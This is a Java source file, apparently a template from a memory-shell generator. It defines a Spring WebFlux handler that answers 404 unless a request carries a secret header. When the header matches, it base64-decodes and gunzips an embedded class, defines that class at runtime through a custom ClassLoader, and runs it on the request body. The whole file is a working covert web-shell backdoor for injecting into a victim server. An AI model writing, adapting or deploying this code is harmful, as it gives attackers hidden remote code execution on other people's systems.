package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.zip.GZIPInputStream;

import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

public class LeoWebFluxHandlerFunctionTpl
        implements HandlerFunction<ServerResponse> {
    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;

    private static int respCode;

    public Mono<ServerResponse> handle(final ServerRequest request) {
        String header = request.headers().firstHeader(headerName);
        if (header == null || !header.contains(headerValue)) return ServerResponse.notFound().build();
        return DataBufferUtils.join(request.bodyToFlux(org.springframework.core.io.buffer.DataBuffer.class))
                .flatMap(buffer -> {
                    try {
                        byte[] bytes = new byte[buffer.readableByteCount()];
                        buffer.read(bytes);
                        return ServerResponse.status(respCode)
                                .body(BodyInserters.fromValue(invokeCore(bytes)));
                    } catch (Throwable ignored) {
                        return ServerResponse.status(500).build();
                    } finally {
                        DataBufferUtils.release(buffer);
                    }
                });
    }

    private byte[] invokeCore(byte[] requestBytes) throws Exception {
        ByteArrayOutputStream exchange = new ByteArrayOutputStream();
        if (requestBytes != null) exchange.write(requestBytes);
        try {
            ((java.lang.reflect.InvocationHandler) loadCore().newInstance()).invoke(null, null, new Object[]{exchange});
        } catch (Throwable e) {
            throw new IllegalStateException("Core invocation failed", e);
        }
        return exchange.toByteArray();
    }

    private Class loadCore() throws Exception {
        ClassLoader loader = getClass().getClassLoader();
        try {
            return Class.forName(coreClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(base64Decode(coreClass)));
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) != -1) output.write(block, 0, read);
            gzip.close();
            byte[] bytes = output.toByteArray();
            return new Loader(loader).define(bytes);
        }
    }

    private static byte[] base64Decode(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, value);
        }
    }

    private static class Loader extends ClassLoader {
        Loader(ClassLoader parent) { super(parent); }
        Class define(byte[] bytes) { return defineClass(null, bytes, 0, bytes.length); }
    }
}
